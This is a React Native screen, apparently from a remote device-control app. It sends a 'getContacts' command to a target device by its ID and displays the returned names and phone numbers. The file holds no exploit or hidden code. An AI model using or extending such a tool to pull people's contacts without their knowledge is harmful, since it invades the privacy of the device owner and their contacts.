import React, { useEffect } from "react";
import { 
    Box,
    StatusBar,
    HStack,
    IconButton,
    Icon,
    Text,
    FlatList,
    VStack,
    Spinner,
    Spacer
} from "native-base";
import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';
import nodejs from 'nodejs-mobile-react-native';
// redux
import { useDispatch, useSelector } from '../../redux/store';
import { resetContacts, setIsLoading } from '../../redux/slices/userInfo'

const Contacts = ({navigation, route}) => {
    const dispatch = useDispatch();
    useEffect(()=>{
        _getContacts();
        dispatch(resetContacts());
      },[])
      const { deviceId } = route.params;
      const { contacts, isLoadingData } = useSelector((state) => state.userInfo);

      const _getContacts=()=>{
        const data = {
          to: deviceId,
          action: "getContacts",
          data:""
        };
        const finalData = JSON.stringify(data);
        nodejs.channel.post('cmd',finalData)
        dispatch(setIsLoading(true));
       }
    
  return (
    <>
    <StatusBar translucent backgroundColor={"transparent"} barStyle="light-content" />
    <Box  safeAreaTop  bg={"primary"} />

    <Box flex={1} bg={"primary"} px={'2'} >
    <HStack my="4" alignItems="center" borderBottomWidth="1" borderBottomColor={'secondary.500'} >
      <IconButton 
         onPress={()=>navigation.goBack()}
         pr={30}
         icon={<Icon as={MaterialCommunityIcons} name="chevron-left-circle" />} 
         borderRadius="full" 
         _icon={{ color:  "tertiary.500", size: "sm"}} 
         _pressed={{ bg: "tertiary.800:alpha.20"}}            
         />
        <Text fontSize={'20'}  color={"secondary.500"}>Contacts</Text>
    </HStack>
    <Box bg="dark.100" borderRadius='5' py="4" px="4" mb='2'>
            <HStack space={3} alignItems={'center'}>
            <Icon as={MaterialCommunityIcons} name="contacts-outline" color={"tertiary.500"} size="5" mr="1"/>
            <Text noOfLines={1} fontSize={'16'} color={"secondary.500"}>{contacts.length} contacts</Text>
            <Spacer/>
            </HStack>
        </Box>
    {isLoadingData&&<Spinner color="secondary.500" />}
    <FlatList 
        data={contacts} 
        renderItem={({item}) => 
        <Box bg="dark.100" borderRadius='5' py="4" px="2" mb='2'>
            <HStack flex={1} space={3} alignItems={'center'}>
            <Icon as={MaterialCommunityIcons} name={"account-circle"} color={"success.400"} size="10" mr="1"/>
           <VStack flex={1} space={1}>
            <Text noOfLines={1} fontSize={'18'} color={"white"}>{item.name}</Text>
            <Text noOfLines={1} fontSize={'16'} color={"secondary.500"}>{item.phoneNo} </Text>
           </VStack>
            </HStack>
        </Box>
        } 
        keyExtractor={(item, index) => index}
        />
    </Box>
    </>
    )
};

export default Contacts;
  